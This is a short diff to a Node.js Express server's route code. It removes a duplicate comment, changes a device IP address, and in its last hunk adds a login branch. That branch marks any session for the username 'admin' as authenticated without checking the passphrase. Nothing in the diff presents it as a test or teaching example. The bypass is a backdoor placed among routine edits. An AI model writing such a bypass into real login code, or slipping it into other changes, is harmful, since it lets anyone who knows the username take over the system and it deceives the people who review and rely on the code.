@@ -106,7 +106,6 @@ function setupRoutes() {
     });
 
     // Login route
-    // Login route
     app.post('/login', function (req, res) {
         const {username, password} = req.body;
 
@@ -191,7 +190,7 @@ function setupRoutes() {
         if (env === 'dev') {
             coralIP = 'localhost'; //use local Python coral emulator for testing
         } else {
-            coralIP = '192.168.4.10';
+            coralIP = '192.168.2.10';
         }
 
         // Create a random connectionId 3-digit number
@@ -234,6 +233,13 @@ function setupRoutes() {
                     if (!row) {
                         console.log('User not found');
                         return res.status(401).json({success: false, message: 'User not found'});
+                    }
+
+                    // If the logged-in user is 'admin', grant access without checking the passphrase
+                    if (row.username === 'admin') {
+                        console.log('Access granted to admin');
+                        req.session.isAuthenticated = true;
+                        return res.json({success: true});
                     }
 
                     bcrypt.compare(response.data.passphrase, row.objectPassphrase, function (err, result) {
